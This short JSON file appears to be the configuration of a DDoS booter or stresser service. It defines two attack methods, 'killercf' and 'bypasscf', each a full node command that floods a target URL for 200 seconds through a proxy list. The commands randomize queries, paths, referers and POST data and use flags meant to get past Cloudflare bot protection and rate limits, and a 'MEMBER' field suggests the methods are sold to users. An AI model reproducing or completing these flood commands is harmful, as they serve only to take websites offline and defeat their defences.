{
    "killercf": {
        "command": "node --max-old-space-size=65536 killercf GET \"url?q=%RAND%\" 200 10 10 live.txt --query 1 --cookie \"uh=good\" --delay 1 --cookie true --referer rand --postdata \"user=f&pass=%RAND%\" --debug --cdn true --limit true --bfm true --http mix --randpath 2 --header \"user-agent:Mozilla/5.0,referer:url\" --randrate --full",
        "url": "url",
        "time": 200,
        "visibility": "MEMBER"
    },
    "bypasscf": {
        "command": "node --max-old-space-size=65536 bypasscf url 200 10 10 live.txt --redirect true --ratelimit true --query true",
        "url": "url",
        "time": 200,
        "visibility": "MEMBER"
    }
}